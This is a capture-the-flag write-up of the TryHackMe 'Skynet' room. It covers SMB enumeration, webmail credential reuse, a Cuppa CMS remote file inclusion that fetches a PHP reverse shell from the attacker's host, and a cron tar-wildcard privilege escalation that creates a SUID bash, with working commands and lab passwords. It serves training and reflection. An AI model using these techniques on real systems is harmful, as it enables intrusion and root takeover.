# Skynet — TryHackMe — ROOT

**Date:** 2026-09-28 → 2026-09-29 (two timeboxes: 45m + 55m)
**Platform:** TryHackMe
**Outcome:** root — **machine 15, Phase B complete (6/6)**
**Time:** ~1h40 total · Confidence self-rated 2.5/5
**Approach:** walkthrough + Google AI assisted (disclosed throughout)
**Tools:** nmap, gobuster, smbmap, smbclient, squirrelmail, exploit-db 25971 (RFI),
python http.server, nc, cron/tar-wildcard privesc

---

## 0. TL;DR chain

nmap (22 ssh · 80 Apache · 110 pop3 · 139/445 Samba · 143 imap) → smbmap: **anonymous
share readable** → smbclient anonymous → `attention.txt` ("password changed after
malfunction") + `logs/log1.txt` (password list) → squirrelmail login
**milesdyson:cyborg007haloterminator** (list's first entry) → email: new SMB password
+ Serena Kogan anomalies (the room's Skynet lore) → `smbclient //ip/milesdyson` →
`notes/important.txt` → **`/45kra24zxs28v3yd`** → gobuster → `/administrator` →
**Cuppa CMS** → exploit-db 25971 RFI: `alertConfigField.php?urlConfig=http://<tun0>/shell.php`
→ php reverse shell → **www-data** → `/etc/crontab` → root's `backup.sh` runs
`tar cf ... *` in `/var/www/html` every minute → **tar wildcard trick** → SUID bash → root

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| 22 | ssh | login | comes later, via the mail creds chain |
| **80** | Apache | web | squirrelmail + the hidden dir |
| **139/445** | Samba 4.3.11 | SMB | **anonymous access — the whole entry point** |
| 110/143 | pop3/imap | mail | the protocol squirrelmail speaks |

Day-one lesson, already debriefed in full — filed here for the record: three NT_STATUS
errors (`ACCESS_DENIED` = creds wrong/missing, `BAD_NETWORK_NAME` = share name wrong,
`LOGON_FAILURE` = password wrong), each naming a different broken piece, none read.
**The error text is the diagnostic.**

## 2. Vulnerability assessment (SMB anonymous → webmail → share)

1. `smbmap -H <ip>` — anonymous has READ ONLY on `anonymous`, NO ACCESS on `milesdyson`.
   Two facts: one door open now, one door that will need creds.
2. Anonymous share: `attention.txt` says passwords were changed after the Skynet
   malfunction; `logs/log1.txt` is a password list. The list is the point.
3. **Squirrelmail** (`/squirrelmail`) accepts `milesdyson` + the list's first entry —
   `cyborg007haloterminator`. Manual try, no brute-force needed.
4. Inbox: the **new SMB password** (`)s{A&2Z=F^n_E.B\``) and two Serena Kogan oddities —
   a binary blob and repeated gibberish. The AI waking up, in email form.
5. `smbclient //<ip>/milesdyson -U milesdyson -p '<password>'` — **single quotes around
   the password**: `)`, `&`, `^` and a backtick are all shell metacharacters; unquoted,
   bash reads them as syntax. (`get` also needs quotes for filenames with spaces —
   same family.)
6. `notes/` holds 37 ML course notes and one 117-byte oddity: **`important.txt`** →
   `1. Add features to beta CMS /45kra24zxs28v3yd` (AI suggested pulling this file;
   the read was the user's).

The shape of the box: **SMB loot → mail creds → share → path → web.** Every layer
fed the next; nothing was brute-forced after the first list try.

## 3. Foothold (Cuppa CMS — RFI)

- `gobuster dir -u http://<ip>/45kra24zxs28v3yd -w dir-list-medium.txt -t 64` →
  `/administrator` → **Cuppa CMS** login.
- **exploit-db 25971**: `alerts/alertConfigField.php` has a `urlConfig` parameter that
  `include`s a remote file — textbook **Remote File Inclusion**. The exploit page's txt
  *is the recipe*: payload format `?urlConfig=http://[attacker]/shell.php`.
- Served a php reverse shell via `python3 -m http.server`, nc listener on the same port,
  then: `http://<ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<tun0>/shell.php`
  → **www-data**, user flag at `/home/milesdyson/user.txt`.

## 4. Privilege escalation (cron + tar wildcard)

`/etc/crontab` (walkthrough shortcut — see miss #3):

```
*/1 *  * * *  root  /home/milesdyson/backups/backup.sh
```

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Two fatal properties: root runs it **every minute**, and the `*` globs in a directory
www-data can write to. tar expands `*` into **command-line arguments** — so a filename
that looks like a tar flag *becomes* a tar flag:

```bash
cd /var/www/html
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh && chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# wait ≤60s →
/tmp/rootbash -p   →  root
```

Explained in own words on the run: two empty files that hijack the wildcard expansion so
tar executes `shell.sh` as root. `--` stops `touch` from reading its own filenames as
flags; `-p` keeps the SUID's privileges.

## 5. Misses and dead ends

- **NT_STATUS barrage (day 1)** — three distinct diagnoses read as one failure; identical
  command re-fired instead. Countermeasure: read the error sentence before the next command.
- **Half-edited kenobi command** — `-N` (no password) kept on an authenticated share.
  Copying a command means re-deciding *every* flag, not just the target.
- **exploit-db txt downloaded, then Google AI asked for its contents** — the payload URL
  was inside the file that was already on disk. Countermeasure: **exploit-db txt files are
  recipes; read the payload line before asking anything.** Same discipline as the error
  text: the answer was in front of the screen.
- **Privesc enumeration skipped** — walkthrough pointed straight at `/etc/crontab`, and
  the enumeration pass (sudo -l → SUID → cron → writable dirs → linpeas) never ran.
  Countermeasure: even in walkthrough mode, run the 5-minute sweep first, *then* confirm
  the walkthrough's target — the skill is knowing where to look, not knowing this answer.
- **GTFOBins check — right reflex, wrong lens.** tar is on GTFOBins, but this isn't a tar
  capability: it's *root's cron globbing `*` in a writable dir*. GTFOBins answers "what
  can this binary do"; the wildcard trick answers "what does root run, and what data does
  it touch."

## 6. Lessons

1. **SMB is a chain, not a port** — anonymous loot → password list → webmail → email →
   authenticated share → hidden path. Mailboxes are loot containers like any archive.
2. **Special characters belong in quotes** — single quotes for passwords (even backticks
   become literal), double quotes for filenames with spaces. Bash reads unquoted `)s{A&2Z`
   as *syntax*, not data.
3. **RFI shape:** an `include`-style parameter + attacker-hosted script = shell. The
   exploit file names the parameter and the payload format; the rest is preflight
   (listener up, correct tun0 IP, file in the served folder).
4. **cron + tar wildcard:** root + `tar ... *` + writable cwd = arbitrary root execution
   via filenames-as-flags. Real-world countermeasure: absolute paths, `--`, never glob
   user-controlled data as root.
5. **Confidence 2.5, honestly rated** — "I could replicate this with a little more
   difficulty" is the accurate read of a walkthrough-assisted run, and saying so is the
   protocol working.
